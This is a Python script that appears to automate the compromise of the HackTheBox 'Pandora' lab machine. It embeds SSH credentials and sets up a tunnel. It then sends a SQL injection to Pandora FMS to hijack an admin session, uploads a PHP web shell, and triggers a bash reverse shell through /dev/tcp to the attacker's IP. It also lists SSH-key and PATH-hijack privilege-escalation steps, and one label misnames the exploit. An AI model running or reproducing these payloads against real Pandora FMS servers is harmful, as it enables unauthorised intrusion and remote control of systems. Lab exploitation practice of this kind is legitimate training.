import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Pandora
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] daniel", "[+] matt", "[+] root" , "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.136" # change this if change ip on htb.
client = paramiko.SSHClient()
host = target_machine
username = "daniel"
password = "HotelBabylon23"


def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Optimum Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def conection_daniel():
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        try:
            shell = client.invoke_shell();cm.sleep(.5)
            while True:
                if shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
                    
                command = input(f"{tmsg} ")
                if command.lower() in ["exit", "quit"]:
                    print("\n[!] Closing connection...")
                    break
                
                shell.send(command + "\n")
                cm.sleep(0.3)
                while shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
            shell.close()
            client.close()
        except Exception as e:
            print(e)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")

def connection_port_fowarding():
    local_port = 80

    try:
        with SSHTunnelForwarder(
            (host, 22),
            ssh_username=username,
            ssh_password=password,
            local_bind_address=('127.0.0.1', local_port),
            remote_bind_address=('127.0.0.1', 80)
        ) as tunnel:
            print(f"[+] Túnel activo: http://127.0.0.1:{local_port} => http://{host}:80")

            # Ahora puedes usar requests como si fuera localhost
            url = f"http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO"
            file_upload_url="http://localhost/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager"
            content_file="http://localhost/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager&directory=images/pwned2"
            try:

                s = requests.Session()
                injection_payload_url=s.get(url)
                cookie=injection_payload_url.headers.get('Set-Cookie').split(";")[0].strip()
                # print(cookie)
                header={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Content-type': 'application/x-www-form-urlencoded',
                    'Cookie': f'{cookie}'
                }

                payload="dirname=pwned2&crt=Create&directory=images&create_dir=1&hash=594175347dddf7a54cc03f6c6d0f04b4&hash2=594175347dddf7a54cc03f6c6d0f04b4"

                file_upload=s.post(file_upload_url, payload, headers=header)
                print(file_upload.status_code)

                
                #====================================
                header['Referer'] = f"http://localhost/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager&directory=images/pwned2&hash2=e4598871baae4b1fc16c136d63b02a19"
                header['Content-type'] = f'multipart/form-data'

                php_payload = """<?php
                echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
                ?>"""

                files = {
                    'file': ('cmd.php', php_payload, 'application/x-php'),
                }

                data = {
                    "umask": "",
                    "decompress_sent": "1",
                    "go": "Go",
                    "real_directory": "/var/www/pandora/pandora_console/images/pwned2",
                    "directory": "images/pwned2",
                    "upload_file_or_zip": "1"
                }

                requests.post(file_upload_url, headers=header, data=data, files=files)
                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [matt-user] > " + Fore.WHITE + f"Press ENTER to continue...")
                s.get(f"http://localhost/pandora_console/images/pwned/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/{machine_ip}/443%200%3E%261%22")
                # print(f"[+] Código de estado: {response.status_code}")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[matt-user Command (If not connect)] > " + Fore.RED + f"Type this commands if failed connection.")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[matt-user Command (Listen-Port-443)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[matt-user Command (Submit cmd.php)] > " + Fore.RED + f"{content_file}")
                commands_send("echo 'PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K' | base64 -d > cmd.php")
                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [matt-user] > " + Fore.WHITE + f"Press ENTER if you submit file cmd.php ...")
                s.get(f"http://localhost/pandora_console/images/pwned2/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/{machine_ip}/443%200%3E%261%22")

            except requests.exceptions.RequestException as req_err:
                print(f"[!] Error al hacer la solicitud: {req_err}")    

    except Exception as e:
        print(f"[!] Error creando el túnel: {e}")



def exploit_user_root():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Injection Victim Machine)] > " + Fore.YELLOW + f"============================\n1. ssh-keygen\n2. cd .ssh/\n3. cat id_rsa.pub > authorized_keys\n4. chmod 600 authorized_keys\n5. cat id_rsa (copy and run with ssh)")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Injection Vcitim Machine)] > " + Fore.YELLOW + f"============================\n1. cd /tmp\n2. touch tar\n3. echo '/usr/bin/sh' > tar\n4. chmod +x tar\n5. pandora_backup\n=========")

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","daniel connection"))
                conection_daniel()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Daniel] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Matt connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Matt] > " + Fore.YELLOW + f"MS16-098-Overflow (Exploit) http://{target_machine}");cm.sleep(0.2)
                connection_port_fowarding()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Matt] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][2]:
                print(tmsg,hmsg("user","Root connection"))
                exploit_user_root()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
